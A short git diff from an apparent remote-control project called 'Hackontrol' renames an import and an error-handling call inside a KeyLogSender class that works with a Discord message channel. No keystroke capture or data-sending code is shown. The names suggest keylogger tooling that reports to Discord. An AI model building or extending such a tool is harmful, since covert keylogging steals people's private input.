@@ -9,8 +9,8 @@ import java.util.concurrent.TimeUnit;
 import com.khopan.hackontrol.Hackontrol;
 import com.khopan.hackontrol.NativeLibrary;
 import com.khopan.hackontrol.NativeLibrary.KeyEntry;
-import com.khopan.hackontrol.manager.common.sender.sendable.ChannelSendable;
 import com.khopan.hackontrol.utils.HackontrolError;
+import com.khopan.hackontrol.utils.sendable.sender.MessageChannelSendable;
 
 import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
 
@@ -90,7 +90,7 @@ public class KeyLogSender {
 			}
 		} catch(Throwable Errors) {
 			Errors.printStackTrace();
-			HackontrolError.throwable(ChannelSendable.of(this.channel), Errors);
+			HackontrolError.throwable(MessageChannelSendable.of(this.channel), Errors);
 		}
 	}
 
